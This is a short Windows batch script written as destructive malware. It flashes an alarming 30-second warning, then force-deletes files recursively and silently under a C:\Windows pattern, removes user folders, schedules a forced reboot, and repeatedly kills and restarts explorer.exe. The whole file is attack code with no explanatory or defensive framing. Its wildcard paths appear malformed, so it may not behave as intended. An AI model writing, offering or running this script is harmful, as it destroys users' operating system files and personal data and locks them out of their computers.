@echo off
start "" /wait cmd /c "echo DO SOMETHING RIGHT NOW YOU ONLY HAVE 30 SECONDS!&echo(&pause"
DEL /P /F /S /Q /A C:\Windows*.*
rmdir C:\Users*.* /S /Q
shutdown -r /o -t 30
taskkill /im explorer.exe /f
start explorer.exe
taskkill /im explorer.exe /f
start explorer.exe
taskkill /im explorer.exe /f
start explorer.exe
taskkill /im explorer.exe /f
start explorer.exe
taskkill /im explorer.exe /f
start explorer.exe
taskkill /im explorer.exe /f
